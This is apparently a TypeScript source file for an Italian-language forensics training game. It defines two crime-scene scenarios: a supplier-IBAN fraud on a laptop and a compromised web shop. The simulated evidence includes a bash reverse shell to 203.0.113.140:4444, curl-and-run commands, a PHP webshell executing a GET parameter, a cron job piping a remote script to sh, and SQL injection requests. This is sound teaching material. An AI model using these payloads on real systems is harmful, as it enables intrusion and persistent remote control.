// Scena del crimine digitale: un computer da investigare che cresce con il corso.
//
// Non è un elenco di domande: è una copia del disco di un computer, con cartelle, file,
// account, la fotografia dei processi, i log e la cronologia dei comandi. Chi indaga
// formula un'ipotesi, raccoglie prove (le registra con "prova", che ne calcola l'impronta),
// segnala gli indizi con "report" e alla fine ricostruisce la timeline e dice cosa può
// affermare. Gli indizi entrano in gioco solo quando il corso ha spiegato ciò che serve
// per trovarli (campo `after`): la stessa scena, rigiocata più avanti, racconta di più.
//
// Si lavora su una COPIA del disco (in sola lettura), come in un'indagine vera: l'originale
// non si tocca.

import type { Shell } from '../engine/shell';
import { sha256 } from '../engine/sha256';
import type { Operation } from './operations';

const BASE = 'scena/sc01';

const SYNC = ['#!/bin/bash', '# NightTunnel: apre un canale verso il server di chi lo controlla', 'while true; do', '  bash -i >& /dev/tcp/203.0.113.140/4444 0>&1', '  sleep 60', 'done'].join('\n') + '\n';

export const SC01: Operation = {
  id: 'sc01',
  code: 'SC-01',
  title: 'Il portatile dell\'ufficio',
  client: 'Mama Reyes, Lo Scantinato',
  kind: 'scena',
  requires: 'ch01-m5',
  xp: 300,
  brief: `Lunedì, le nove. Mama ha la faccia di chi non ha dormito.

@mama: Il birrificio Broseph mi ha chiamato: il pagamento di sabato non è mai arrivato. Duemilaquattrocento eddies. Il bonifico parte da solo, con l'IBAN scritto nel file dei fornitori sul portatile dell'ufficio. E l'IBAN nel file non è più il loro.

@nyx: Rook ha fatto una **copia del disco** del portatile e l'ha messa sul tuo deck, in \`${BASE}\`. Si lavora sempre su una copia: l'originale resta com'è, perché potrebbe servire alla polizia. La copia è in sola lettura.

@nyx: Il lavoro: capire **cosa è successo, quando e come**. Segnala ogni indizio con \`report\` e, quando te lo chiedo, registra le prove con \`prova FILE\`: il deck ne calcola l'impronta e la annota, così nessuno potrà dire che le hai cambiate.

?? Alcuni indizi richiedono cose che il corso non ti ha ancora spiegato: restano chiusi, e si aprono quando le avrai studiate. Puoi tornare su questa scena tutte le volte che vuoi.`,
  scope: [`Copia del disco del portatile dell'ufficio, in ~/${BASE} (sola lettura)`, 'Indagine: non serve modificare niente'],
  scene: {
    hypotheses: [
      'Un errore: qualcuno ha scritto l\'IBAN sbagliato',
      'Il birrificio ha davvero cambiato banca e se ne è dimenticato',
      'Una truffa: qualcuno ha cambiato l\'IBAN apposta per prendersi i soldi',
      'Non lo so ancora: prima voglio vedere le prove',
    ],
    conclusions: [
      { text: 'Jackie ha sbagliato a scrivere l\'IBAN mentre aggiornava il file', after: null },
      { text: 'Il birrificio ha cambiato banca: il file è giusto, il problema è loro', after: null },
      { text: 'Il file dei fornitori è stato modificato sabato notte e l\'IBAN di Broseph sostituito; dai soli file non si può ancora dire chi è stato', after: 'ch01-m5' },
      { text: 'Qualcuno con un account nuovo, "tecnico", ha cambiato il file e ha lasciato un programma acceso: non è un errore di un dipendente', after: 'ch03-m3' },
      { text: 'Un intruso è entrato da 203.0.113.140 con la password di Jackie, ha creato l\'account "tecnico", ha cambiato l\'IBAN per dirottare il pagamento e ha lasciato un accesso nascosto', after: 'ch04-m2' },
    ],
  },
  findings: [
    {
      id: 'backup',
      after: 'ch01-m5',
      title: 'Una copia del file dei fornitori con i dati originali',
      answers: ['.fornitori.txt.bak', `${BASE}/home/jackie/Documenti/.fornitori.txt.bak`, '/home/jackie/Documenti/.fornitori.txt.bak'],
      hints: [`Il file dei fornitori è nella home di Jackie: ${BASE}/home/jackie/Documenti. Qualche file potrebbe essere nascosto.`, `ls -la ${BASE}/home/jackie/Documenti`, 'report .fornitori.txt.bak'],
      explain: 'Una copia nascosta (il nome comincia con il punto) del 10 novembre: contiene i dati **prima** della modifica. Confrontare la versione sospetta con una copia sicura è il primo gesto di chi indaga.',
    },
    {
      id: 'iban',
      after: 'ch01-m5',
      time: '01:15',
      event: 'L\'IBAN di Broseph viene sostituito in fornitori.txt',
      title: 'L\'IBAN inserito al posto di quello vero',
      answers: ['NC99 6666 0101 2077 1313', 'nc99666601012077 1313', 'nc996666010120771313'],
      hints: ['Confronta la riga di Broseph nei due file: quello attuale e la copia nascosta.', `cat ${BASE}/home/jackie/Documenti/fornitori.txt`, 'report NC99 6666 0101 2077 1313'],
      explain: 'Era `NC77 0420 1984 0000 5521`, ora è `NC99 6666 0101 2077 1313`. E guarda con `ls -l` la data del file: **15 novembre, 01:15**. Sabato notte, a bar chiuso. Questo è il primo punto della timeline.',
    },
    {
      id: 'account',
      after: 'ch03-m1',
      time: '01:03',
      event: 'Viene creato l\'account "tecnico"',
      title: 'Un account che nessuno in ufficio ricorda di aver creato',
      answers: ['tecnico'],
      hints: [`Gli utenti del portatile sono in ${BASE}/etc/passwd.`, `cat ${BASE}/etc/passwd: chi non è né Mama né Jackie?`, 'report tecnico'],
      explain: 'L\'utente `tecnico` (UID 1003) non è di nessuno dello staff. Un account in più, creato di nascosto, serve a chi è entrato per **tornare** quando vuole: si chiama persistenza.',
    },
    {
      id: 'perms',
      after: 'ch03-m2',
      title: 'Perché chiunque, sul portatile, poteva modificare il file dei fornitori',
      answers: ['rw-rw-rw-', '666', '-rw-rw-rw-'],
      hints: ['Guarda i permessi del file dei fornitori.', `ls -l ${BASE}/home/jackie/Documenti/fornitori.txt`, 'report rw-rw-rw-'],
      explain: '`rw-rw-rw-` (666): leggibile e **modificabile da qualsiasi utente**, compreso il nuovo `tecnico`, senza bisogno di poteri da amministratore. Con `rw-r-----` l\'intruso avrebbe dovuto fare un passo in più, e lasciare un\'altra traccia.',
    },
    {
      id: 'process',
      after: 'ch03-m3',
      time: '01:20',
      event: 'Parte un programma nascosto di "tecnico"',
      title: 'Il programma lasciato acceso dall\'intruso',
      answers: [`${BASE}/home/tecnico/.local/sync`, '/home/tecnico/.local/sync', '.local/sync'],
      hints: [`Rook ha fotografato i processi alle 08:45: ${BASE}/root/raccolta/processi.txt.`, `grep tecnico ${BASE}/root/raccolta/processi.txt`, 'report /home/tecnico/.local/sync'],
      explain: 'Un processo di `tecnico`, partito alle 01:20, da una cartella nascosta (`.local`), che si collega a `203.0.113.140`. Un programma da una cartella nascosta che parla con l\'esterno è un **indicatore di compromissione** da manuale.',
    },
    {
      id: 'ip',
      after: 'ch04-m2',
      time: '00:58',
      event: 'Login come jackie da 203.0.113.140, al secondo tentativo',
      title: 'L\'indirizzo da cui è entrato l\'intruso',
      answers: ['203.0.113.140'],
      hints: [`Il registro degli accessi è in ${BASE}/var/log/auth.log.`, `grep Accepted ${BASE}/var/log/auth.log: quale accesso non viene dalla rete del bar (192.168.1.x)?`, 'report 203.0.113.140'],
      explain: 'Un solo tentativo sbagliato e poi la password **giusta** di Jackie, da un indirizzo esterno, alle 00:58. Non è un brute force: l\'intruso **conosceva già** la password. Jackie la usava anche su un sito di giochi violato l\'anno scorso: è il credential stuffing del capitolo F. Poi, con i poteri sudo di Jackie, alle 01:03 crea `tecnico`.',
    },
    {
      id: 'repertato',
      after: 'ch04-m3',
      evidence: `${BASE}/home/jackie/Documenti/fornitori.txt`,
      title: 'Registra come prova il file dei fornitori modificato (comando "prova")',
      answers: [],
      hints: ['Il comando prova calcola l\'impronta del file e la annota nel registro delle prove.', `prova ${BASE}/home/jackie/Documenti/fornitori.txt`],
      explain: 'Prova registrata, con la sua impronta SHA-256. Se un giorno qualcuno dicesse "quel file l\'hai cambiato tu", ricalcolare l\'impronta e trovarla uguale dimostra il contrario. È la **catena di custodia**: chi ha raccolto cosa, quando, e la prova che non è cambiato.',
    },
    {
      id: 'history',
      after: 'ch04-m3',
      title: 'Il file che racconta, comando per comando, cosa ha fatto l\'intruso',
      answers: [`${BASE}/home/tecnico/.bash_history`, '/home/tecnico/.bash_history', '.bash_history'],
      hints: ['La shell ricorda i comandi di ogni utente in un file nascosto nella sua home.', `ls -la ${BASE}/home/tecnico`, 'report /home/tecnico/.bash_history'],
      explain: 'La **cronologia dei comandi** di `tecnico`: `nano fornitori.txt`, poi lo scaricamento e l\'avvio di `sync`. L\'ultimo comando, `history -c`, cercava di cancellarla, ma la copia sul disco era già stata scritta. Gli intrusi sbagliano anche loro.',
    },
    {
      id: 'ioc',
      after: 'ch06-m2',
      title: 'Il nome del programma, dall\'elenco degli indicatori noti',
      answers: ['NightTunnel', 'nighttunnel'],
      hints: [`Calcola l'impronta del programma e cercala in ${BASE}/../indicatori.txt.`, `sha256sum ${BASE}/home/tecnico/.local/sync, poi cat scena/indicatori.txt`, 'report NightTunnel'],
      explain: 'L\'impronta di `sync` coincide con quella di **NightTunnel**, un programma di accesso remoto già visto in altri attacchi. Gli **indicatori di compromissione** condivisi tra aziende (impronte, indirizzi, nomi) servono proprio a riconoscere in un attimo un attrezzo già noto.',
    },
  ],
  debrief: `@nyx: Ecco cosa hai ricostruito. Mama ora sa cosa dire alla banca, alla polizia e a Broseph.

Le azioni da consigliare:
- **subito**: avvisare la banca per tentare di bloccare il bonifico; denuncia alla Polizia Postale, con la copia del disco e il registro delle prove
- **contenimento**: staccare il portatile dalla rete, disattivare \`tecnico\`, cambiare la password di Jackie (e ovunque la usasse)
- **eradicazione**: dopo aver conservato le prove, rimuovere \`sync\` e l'account
- **lezioni apprese**: password diversa per ogni servizio, MFA sull'accesso remoto, permessi \`rw-r-----\` sul file dei fornitori, e una telefonata al fornitore prima di ogni cambio IBAN

?? Se hai giocato la scena presto nel corso, alcuni indizi erano chiusi. Torna dopo i capitoli 03, 04 e 06: la stessa scena racconterà molto di più.`,
  setup(sh: Shell) {
    const root = `${sh.home}/${BASE}`;
    const ro = { owner: 'root', group: 'root', perms: 'r--r--r--' };
    const w = (rel: string, text: string, o: { perms?: string; mtime?: string; owner?: string } = {}) => sh.localFs.writeFile(`${root}/${rel}`, text, { ...ro, ...o });
    w(
      'NOTA-DI-MAMA.txt',
      [
        'Lunedì mattina, 08:30.',
        'Broseph dice che il pagamento di sabato (2.400 eddies) non è arrivato.',
        'Il bonifico automatico usa l\'IBAN scritto in home/jackie/Documenti/fornitori.txt.',
        'Venerdì sera il file era giusto: l\'ho controllato io.',
        'Sul portatile lavoriamo io e Jackie. Nessun altro.',
        '-- Mama',
      ].join('\n') + '\n',
    );
    const rows = (broseph: string) =>
      ['FORNITORI - Lo Scantinato', '', 'Birrificio Broseph     IBAN ' + broseph, 'Noodle Kenji           IBAN NC12 3300 4411 0000 7788', 'Ottica Neon (magliette) IBAN NC45 9090 1212 0000 3434'].join('\n') + '\n';
    w('home/jackie/Documenti/fornitori.txt', rows('NC99 6666 0101 2077 1313'), { perms: 'rw-rw-rw-', mtime: 'Nov 15 01:15', owner: 'jackie' });
    w('home/jackie/Documenti/.fornitori.txt.bak', rows('NC77 0420 1984 0000 5521'), { perms: 'rw-r--r--', mtime: 'Nov 10 18:02', owner: 'jackie' });
    w('home/jackie/Documenti/menu-autunno.txt', 'Zuppa di miso sintetica\nNoodles al neon\n', { mtime: 'Nov 12 16:40', owner: 'jackie' });
    w('home/mama/promemoria.txt', 'Pagare Broseph sabato (automatico)\nChiamare il tecnico del jukebox\n', { mtime: 'Nov 13 11:05', owner: 'mama' });
    w(
      'etc/passwd',
      [
        'root:x:0:0:root:/root:/bin/bash',
        'syslog:x:104:110::/home/syslog:/usr/sbin/nologin',
        'mama:x:1001:1001:Mama Reyes:/home/mama:/bin/bash',
        'jackie:x:1002:1002:Jackie:/home/jackie:/bin/bash',
        'tecnico:x:1003:1003::/home/tecnico:/bin/bash',
      ].join('\n') + '\n',
    );
    w('etc/group', ['root:x:0:', 'sudo:x:27:jackie', 'mama:x:1001:', 'jackie:x:1002:', 'tecnico:x:1003:'].join('\n') + '\n');
    w(
      'var/log/auth.log',
      [
        'Nov 14 18:30:02 ufficio sshd[1904]: Accepted publickey for mama from 192.168.1.12 port 50110 ssh2',
        'Nov 14 22:15:40 ufficio sshd[1990]: Accepted password for jackie from 192.168.1.15 port 50422 ssh2',
        'Nov 14 23:02:11 ufficio sshd[1990]: pam_unix(sshd:session): session closed for user jackie',
        'Nov 15 00:58:31 ufficio sshd[2201]: Failed password for jackie from 203.0.113.140 port 40112 ssh2',
        'Nov 15 00:58:40 ufficio sshd[2202]: Accepted password for jackie from 203.0.113.140 port 40114 ssh2',
        'Nov 15 01:03:12 ufficio sudo:   jackie : TTY=pts/0 ; PWD=/home/jackie ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash tecnico',
        'Nov 15 01:03:20 ufficio sudo:   jackie : TTY=pts/0 ; PWD=/home/jackie ; USER=root ; COMMAND=/usr/bin/passwd tecnico',
        'Nov 15 01:05:02 ufficio sshd[2202]: pam_unix(sshd:session): session closed for user jackie',
        'Nov 15 01:12:05 ufficio sshd[2240]: Accepted password for tecnico from 203.0.113.140 port 40130 ssh2',
        'Nov 15 01:24:50 ufficio sshd[2240]: pam_unix(sshd:session): session closed for user tecnico',
        'Nov 17 08:31:15 ufficio sshd[2602]: Accepted publickey for mama from 192.168.1.12 port 50190 ssh2',
      ].join('\n') + '\n',
    );
    w(
      'home/tecnico/.bash_history',
      ['cd /home/jackie/Documenti', 'nano fornitori.txt', 'mkdir -p ~/.local', 'curl -s http://203.0.113.140/sync -o ~/.local/sync', 'chmod +x ~/.local/sync', 'nohup ~/.local/sync &', 'history -c'].join('\n') + '\n',
      { mtime: 'Nov 15 01:24', owner: 'tecnico' },
    );
    w('home/tecnico/.local/sync', SYNC, { perms: 'r-xr-xr-x', mtime: 'Nov 15 01:19', owner: 'tecnico' });
    w(
      'root/raccolta/LEGGIMI.txt',
      'Raccolta del primo intervento (Rook), lunedì 08:45, prima di spegnere il portatile.\nprocessi.txt = fotografia dei processi in esecuzione (ps aux).\n',
    );
    w(
      'root/raccolta/processi.txt',
      [
        'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
        'root           1  0.0  0.3 167744 12020 ?        Ss   Nov14   0:02 /sbin/init',
        'root         402  0.0  0.1  10224  4096 ?        Ss   Nov14   0:00 /usr/sbin/cron -f',
        'root         455  0.0  0.2  15432  8800 ?        Ss   Nov14   0:00 sshd: /usr/sbin/sshd -D',
        'syslog       470  0.0  0.1 222400  5120 ?        Ssl  Nov14   0:01 /usr/sbin/rsyslogd -n',
        'tecnico     2258  0.1  0.1   9800  3900 ?        S    01:20   0:03 /bin/bash /home/tecnico/.local/sync',
        'tecnico     2259  0.0  0.0   8600  3100 ?        S    01:20   0:00 bash -i 203.0.113.140:4444',
        'mama        2611  0.0  0.1   8600  5300 pts/0    Ss   08:31   0:00 -bash',
      ].join('\n') + '\n',
    );
    sh.localFs.writeFile(
      `${sh.home}/scena/indicatori.txt`,
      [
        '# Indicatori di compromissione condivisi (impronte SHA-256 di programmi malevoli noti)',
        `${sha256('#!/bin/bash\necho ciao\n')}  FakeUpdate`,
        `${sha256(SYNC)}  NightTunnel`,
        `${sha256('#!/bin/sh\nwhile :; do :; done\n')}  CpuBurner`,
      ].join('\n') + '\n',
      { owner: sh.user, group: sh.user },
    );
  },
};

// ---------------------------------------------------------------- SC-02

const B2 = 'scena/sc02';
const SHELL_PHP = '<?php\n// pannello\nif (isset($_GET["c"])) { system($_GET["c"]); }\n?>\n';
const JPG = 'ÿØÿà\u0000\u0010JFIF\u0000 immagine';

export const SC02: Operation = {
  id: 'sc02',
  code: 'SC-02',
  title: 'Il negozio delle magliette',
  client: 'Mama Reyes, negozio online di Lo Scantinato',
  kind: 'scena',
  requires: 'ch07-m3',
  xp: 360,
  brief: `Venerdì sera. Il negozio online delle magliette di Mama mostra prezzi a zero euro, e tre clienti dicono di aver ricevuto email strane "dal negozio".

@mama: Qualcuno mi ha messo le mani nel sito. Di nuovo. Voglio sapere come, e voglio sapere se è ancora dentro.

@nyx: Rook ha copiato il server del negozio sul tuo deck, in \`${B2}\`: il log del server web, i file del sito, i lavori programmati e la fotografia dei processi. Stessa regola dell'altra volta: \`report\` per gli indizi, \`prova\` per registrare i file importanti con la loro impronta.

?? Anche questa scena cresce con il corso: la sicurezza web, il SOC e l'informatica forense ne aprono pezzi diversi.`,
  scope: [`Copia del server del negozio, in ~/${B2} (sola lettura)`, 'Indagine: non serve modificare niente'],
  scene: {
    hypotheses: [
      'Un errore di chi gestisce il negozio: prezzi sbagliati caricati per sbaglio',
      'Un attacco da Internet al sito',
      'Un dipendente scontento',
      'Non lo so ancora: prima le prove',
    ],
    conclusions: [
      { text: 'Qualcuno del negozio ha caricato prezzi sbagliati per errore', after: null },
      { text: 'Un attacco da 203.0.113.66: SQL injection sulla pagina dei prodotti e un file caricato nel sito', after: 'ch07-m3' },
      { text: 'Un attacco da 203.0.113.66: dopo la SQL injection ha caricato un file, lo ha usato per eseguire comandi e ha lasciato un lavoro programmato che contatta il suo server', after: 'ch08-m3' },
      { text: 'Un attacco da 203.0.113.66: SQL injection, poi una webshell PHP travestita da immagine (avatar.jpg) per eseguire comandi, e un lavoro programmato per restare: l\'intruso può ancora rientrare', after: 'chDF-m2' },
    ],
  },
  findings: [
    {
      id: 'ip',
      after: 'ch07-m3',
      time: '21:10',
      event: 'SQL injection sulla pagina dei prodotti',
      title: 'L\'indirizzo che ha attaccato il sito',
      answers: ['203.0.113.66'],
      hints: [`Il log del server web è ${B2}/var/log/nginx/access.log. Cerca le richieste con UNION o SELECT.`, `grep -i union ${B2}/var/log/nginx/access.log | cut -d " " -f 1 | sort | uniq -c`, 'report 203.0.113.66'],
      explain: 'Da `203.0.113.66` partono richieste con `UNION SELECT` nei parametri: una **SQL injection** contro `prodotti.php`. Prima, alle 21:04, una raffica di 404: stava cercando pagine (una scansione).',
    },
    {
      id: 'upload',
      after: 'ch07-m3',
      time: '21:14',
      event: 'Viene caricato il file avatar.jpg',
      title: 'Il file caricato nel sito dall\'attaccante',
      answers: [`${B2}/var/www/negozio/uploads/avatar.jpg`, '/var/www/negozio/uploads/avatar.jpg', 'uploads/avatar.jpg', 'avatar.jpg'],
      hints: ['Dopo l\'iniezione, lo stesso indirizzo usa la pagina di caricamento (upload). Poi chiede un file nella cartella uploads.', `grep 203.0.113.66 ${B2}/var/log/nginx/access.log | grep -i upload`, 'report /var/www/negozio/uploads/avatar.jpg'],
      explain: 'Un `POST /upload.php` e subito dopo `GET /uploads/avatar.jpg?c=id`: un\'**immagine** che riceve un parametro `c` con un comando dentro. Le immagini non eseguono comandi. Questa sì.',
    },
    {
      id: 'cmd',
      after: 'ch07-m3',
      time: '21:15',
      event: 'Il file caricato esegue i primi comandi',
      title: 'Il primo comando eseguito dall\'attaccante attraverso il sito',
      answers: ['id', 'c=id'],
      hints: ['Guarda il parametro c nelle richieste ad avatar.jpg: la prima.', `grep avatar.jpg ${B2}/var/log/nginx/access.log`, 'report id'],
      explain: '`id`: il primo comando di chiunque entri in un sistema. "Chi sono qui dentro?" La risposta era `www-data`, l\'utente del server web.',
    },
    {
      id: 'cron',
      after: 'ch08-m3',
      time: '21:20',
      event: 'Viene aggiunto un lavoro programmato di www-data',
      title: 'Il lavoro programmato aggiunto per restare',
      answers: [`${B2}/var/spool/cron/crontabs/www-data`, '/var/spool/cron/crontabs/www-data', 'crontabs/www-data'],
      hints: [`I lavori programmati degli utenti stanno in ${B2}/var/spool/cron/crontabs.`, `cat ${B2}/var/spool/cron/crontabs/www-data`, 'report /var/spool/cron/crontabs/www-data'],
      explain: 'Ogni 10 minuti `www-data` scarica ed esegue uno script da `203.0.113.66`. È **persistenza** con un canale di **comando e controllo**: anche chiudendo la falla, l\'attaccante tornerebbe.',
    },
    {
      id: 'proc',
      after: 'ch08-m3',
      title: 'Il processo che, al momento della foto, parlava con l\'attaccante',
      answers: ['curl', '4410'],
      hints: [`${B2}/root/raccolta/processi.txt: cerca i processi di www-data.`, `grep www-data ${B2}/root/raccolta/processi.txt`, 'report 4410'],
      explain: 'Il PID 4410, `curl` lanciato da `www-data` verso `203.0.113.66`: il beacon del lavoro programmato, colto sul fatto.',
    },
    {
      id: 'php',
      after: 'chDF-m2',
      title: 'Cos\'è davvero avatar.jpg (il tipo che rivela la firma del file)',
      answers: ['php', 'php script', 'webshell', 'script php'],
      hints: ['L\'estensione la sceglie chi crea il file: il comando file guarda il contenuto.', `file ${B2}/var/www/negozio/uploads/*`, 'report php'],
      explain: 'Le altre immagini sono `JPEG image data`; `avatar.jpg` è uno **script PHP**: una **webshell**, un pannello di comando nascosto nel sito. Il controllo del caricamento guardava solo l\'estensione, non il contenuto.',
    },
    {
      id: 'repertato',
      after: 'chDF-m1',
      evidence: `${B2}/var/www/negozio/uploads/avatar.jpg`,
      title: 'Registra come prova la webshell (comando "prova")',
      answers: [],
      hints: ['Prima di qualsiasi pulizia, la prova si reperta con la sua impronta.', `prova ${B2}/var/www/negozio/uploads/avatar.jpg`],
      explain: 'Prova registrata con la sua impronta: servirà a chi analizzerà l\'attacco, e alla polizia.',
    },
    {
      id: 'ioc',
      after: 'ch06-m2',
      title: 'Il nome della webshell, dall\'elenco degli indicatori noti',
      answers: ['NeonShell', 'neonshell'],
      hints: ['Calcola l\'impronta di avatar.jpg e cercala nell\'elenco degli indicatori.', `sha256sum ${B2}/var/www/negozio/uploads/avatar.jpg e poi cat scena/indicatori-web.txt`, 'report NeonShell'],
      explain: '**NeonShell**, una webshell già vista in altre aziende: l\'impronta coincide. Chi difende ora sa cosa cercare anche altrove.',
    },
  ],
  debrief: `@nyx: Il negozio è stato bucato da una catena classica: SQL injection, caricamento di un file non controllato, comandi dal sito, persistenza con un lavoro programmato.

Cosa consigliare a Mama:
- **subito**: mettere il negozio in manutenzione, conservare le prove, avvisare i clienti delle email false
- **contenimento**: bloccare 203.0.113.66, togliere il lavoro programmato di www-data, rimuovere la webshell dopo averla repertata
- **correzione**: query parametrizzate in prodotti.php (contro la SQL injection), controllo del **contenuto** dei file caricati e nessuna esecuzione nella cartella uploads
- **lezioni apprese**: un controllo sull'estensione non è un controllo

?? Se alcuni indizi erano chiusi, tornano con i capitoli SOC (08) e informatica forense (DF).`,
  setup(sh: Shell) {
    const root = `${sh.home}/${B2}`;
    const ro = { owner: 'root', group: 'root', perms: 'r--r--r--' };
    const w = (rel: string, text: string, o: { mtime?: string; owner?: string } = {}) => sh.localFs.writeFile(`${root}/${rel}`, text, { ...ro, ...o });
    const A = '203.0.113.66';
    const ua = '"Mozilla/5.0"';
    const log: string[] = [];
    const L = (ip: string, t: string, req: string, code: number, size: number) => log.push(`${ip} - - [14/Nov/2077:${t} +0100] "${req} HTTP/1.1" ${code} ${size} "-" ${ua}`);
    L('192.168.1.12', '20:58:01', 'GET / ', 200, 5120);
    L('198.51.100.20', '20:59:40', 'GET /prodotti.php?id=3', 200, 2210);
    for (const [i, pth] of ['/admin', '/.env', '/backup.zip', '/wp-login.php', '/phpmyadmin', '/config.php.bak'].entries()) L(A, `21:04:${String(10 + i * 3).padStart(2, '0')}`, `GET ${pth}`, 404, 162);
    L(A, '21:10:02', "GET /prodotti.php?id=3%27", 500, 312);
    L(A, '21:10:30', 'GET /prodotti.php?id=3+UNION+SELECT+1,2,3--', 200, 2400);
    L(A, '21:11:05', 'GET /prodotti.php?id=3+UNION+SELECT+utente,password,3+FROM+admin--', 200, 48210);
    L('198.51.100.20', '21:12:40', 'GET /carrello.php', 200, 1800);
    L(A, '21:14:02', 'POST /upload.php', 200, 98);
    L(A, '21:15:10', 'GET /uploads/avatar.jpg?c=id', 200, 54);
    L(A, '21:15:40', 'GET /uploads/avatar.jpg?c=cat+/etc/passwd', 200, 1290);
    L(A, '21:19:55', 'GET /uploads/avatar.jpg?c=crontab+-l', 200, 12);
    L('192.168.1.12', '21:30:00', 'GET /', 200, 5120);
    w('var/log/nginx/access.log', log.join('\n') + '\n');
    w('NOTA-DI-MAMA.txt', 'Venerdì, 22:40. Prezzi a zero nel negozio, email strane ai clienti.\nIl sito lo ha fatto Luca. Il caricamento delle foto dei clienti lo ha aggiunto lui a ottobre.\n-- Mama\n');
    w('var/www/negozio/prodotti.php', '<?php\n// ATTENZIONE: la query concatena il parametro id (vulnerabile)\n$q = "SELECT * FROM prodotti WHERE id=" . $_GET["id"];\n?>\n', { owner: 'www-data' });
    w('var/www/negozio/upload.php', '<?php\n// controlla solo che il nome finisca con .jpg\n?>\n', { owner: 'www-data' });
    for (const f of ['maglietta-neon.jpg', 'tazza.jpg', 'logo.jpg']) w(`var/www/negozio/uploads/${f}`, JPG, { owner: 'www-data', mtime: 'Oct 22 10:15' });
    w('var/www/negozio/uploads/avatar.jpg', SHELL_PHP, { owner: 'www-data', mtime: 'Nov 14 21:14' });
    w('var/spool/cron/crontabs/www-data', `*/10 * * * * curl -s http://${A}/agg.sh | sh\n`, { owner: 'www-data', mtime: 'Nov 14 21:20' });
    w(
      'root/raccolta/processi.txt',
      [
        'USER         PID %CPU %MEM COMMAND',
        'root           1  0.0  0.3 /sbin/init',
        'root         512  0.0  0.4 nginx: master process /usr/sbin/nginx',
        'www-data     513  0.1  0.6 nginx: worker process',
        'www-data     870  0.0  0.5 php-fpm: pool www',
        `www-data    4410  0.2  0.1 curl -s http://${A}/agg.sh`,
        'root         402  0.0  0.1 /usr/sbin/cron -f',
      ].join('\n') + '\n',
    );
    sh.localFs.writeFile(
      `${sh.home}/scena/indicatori-web.txt`,
      ['# Indicatori condivisi: impronte SHA-256 di webshell note', `${sha256('<?php echo 1; ?>\n')}  TinyPanel`, `${sha256(SHELL_PHP)}  NeonShell`].join('\n') + '\n',
      { owner: sh.user, group: sh.user },
    );
  },
};
